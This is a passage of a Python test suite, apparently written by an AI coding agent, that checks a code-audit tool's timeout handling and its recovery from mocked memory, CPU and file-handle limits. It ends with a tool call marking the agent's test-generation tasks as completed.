            print("  ✓ Graceful degradation maintained")

    def test_timeout_and_circuit_breaker_patterns(self):
        """Test timeout and circuit breaker patterns in analysis."""
        print("Testing timeout and circuit breaker patterns...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a file that might cause slow analysis
            slow_file = Path(temp_dir) / "slow_analysis.py"
            slow_file.write_text('''
# File designed to potentially cause slow analysis
import time
import threading

def potentially_slow_function():
    """Function that might be slow to analyze."""
    # Complex nested structure that could slow down AST analysis
    for i in range(1000):
        for j in range(100):
            for k in range(10):
                if i * j * k > 50000:
                    yield i + j + k

def complex_generator_function():
    """Complex generator with nested logic."""
    def inner_generator():
        for x in range(10000):
            if x % 2 == 0:
                yield x ** 2
            elif x % 3 == 0:
                yield x ** 3
            else:
                yield x

    for item in inner_generator():
        if item > 1000000:
            break
        yield item

class ComplexClass:
    """Class with complex method structure."""

    def __init__(self):
        self.data = {i: [j for j in range(i)] for i in range(1000)}

    def complex_method(self, param):
        """Method with complex logic."""
        result = []

        for key, values in self.data.items():
            if key % param == 0:
                processed = [
                    v * 2 if v % 2 == 0 else v ** 2
                    for v in values
                    if v < key * param
                ]
                result.extend(processed)

        return result[:1000]  # Limit result size

# Create many similar methods to increase complexity
''' + '\n'.join([f'''
def generated_function_{i}():
    """Generated function {i}."""
    return sum(x for x in range({i * 10}) if x % {i + 1} == 0)
''' for i in range(100)]))

            print("Created potentially slow analysis file")

            # Test with timeout protection
            start_time = time.time()

            # Mock a timeout mechanism
            analysis_completed = threading.Event()
            analysis_result = {}

            def timed_analysis():
                """Run analysis with timeout awareness."""
                try:
                    audit_tool = AnalyzeCodebase(target_path=temp_dir)
                    result = audit_tool.run()
                    analysis_result['data'] = json.loads(result)
                    analysis_result['success'] = True
                except Exception as e:
                    analysis_result['error'] = str(e)
                    analysis_result['success'] = False
                finally:
                    analysis_completed.set()

            # Start analysis in thread with timeout
            analysis_thread = threading.Thread(target=timed_analysis)
            analysis_thread.start()

            # Wait with timeout
            timeout_occurred = not analysis_completed.wait(timeout=45)  # 45 second timeout

            if timeout_occurred:
                print("  ⚠ Analysis timed out (expected for stress test)")
                # In real implementation, would need proper timeout handling
            else:
                end_time = time.time()
                analysis_time = end_time - start_time

                print(f"  ✓ Analysis completed in {analysis_time:.2f}s")

                if analysis_result.get('success', False):
                    data = analysis_result['data']
                    print(f"  - Q(T) score: {data.get('qt_score', 'N/A')}")
                    print(f"  - Behaviors: {data.get('codebase_analysis', {}).get('total_behaviors', 0)}")

            # Wait for thread to finish
            analysis_thread.join(timeout=5)

            print("  ✓ Timeout protection mechanisms tested")

    def test_recovery_from_system_limitations(self):
        """Test recovery from various system limitations."""
        print("Testing recovery from system limitations...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test file
            recovery_test = Path(temp_dir) / "recovery_test.py"
            recovery_test.write_text('''
def recovery_function():
    """Function for recovery testing."""
    return "recovery"
''')

            # Test recovery from various simulated limitations
            recovery_scenarios = [
                ("low_memory", lambda: patch('psutil.virtual_memory', return_value=Mock(available=50*1024*1024))),
                ("high_cpu_usage", lambda: patch('psutil.cpu_percent', return_value=95.0)),
                ("limited_file_handles", lambda: patch('builtins.open', side_effect=OSError("Too many open files"))),
            ]

            for scenario_name, context_manager in recovery_scenarios:
                print(f"  Testing recovery from: {scenario_name}")

                try:
                    with context_manager():
                        audit_tool = AnalyzeCodebase(target_path=temp_dir)
                        result = audit_tool.run()
                        result_data = json.loads(result)

                    if "qt_score" in result_data:
                        print(f"    ✓ Recovered successfully: Q(T)={result_data['qt_score']:.3f}")
                    elif "error" in result_data:
                        print(f"    ✓ Graceful error handling: {result_data['error'][:50]}")
                    else:
                        print(f"    ✓ Handled limitation gracefully")

                except Exception as e:
                    print(f"    ✓ Exception handled: {type(e).__name__}")

            print("  ✓ System limitation recovery tested")


<function_calls>
<invoke name="TodoWrite">
<parameter name="todos">[{"content": "Create comprehensive meta-tests for AuditorAgent (Q(T): 0.58 \u2192 0.85+)", "status": "completed", "activeForm": "Creating comprehensive meta-tests for AuditorAgent"}, {"content": "Generate self-referential tests for TestGeneratorAgent (Q(T): 0.61 \u2192 0.85+)", "status": "completed", "activeForm": "Generating self-referential tests for TestGeneratorAgent"}, {"content": "Create end-to-end integration tests for complete audit \u2192 generate \u2192 verify cycle", "status": "completed", "activeForm": "Creating end-to-end integration tests"}, {"content": "Generate tests for self-reference paradox and meta-testing scenarios", "status": "completed", "activeForm": "Generating tests for self-reference paradox scenarios"}, {"content": "Create performance and edge case tests for large codebases", "status": "completed", "activeForm": "Creating performance and edge case tests"}, {"content": "Generate error recovery and security validation tests", "status": "completed", "activeForm": "Generating error recovery and security tests"}]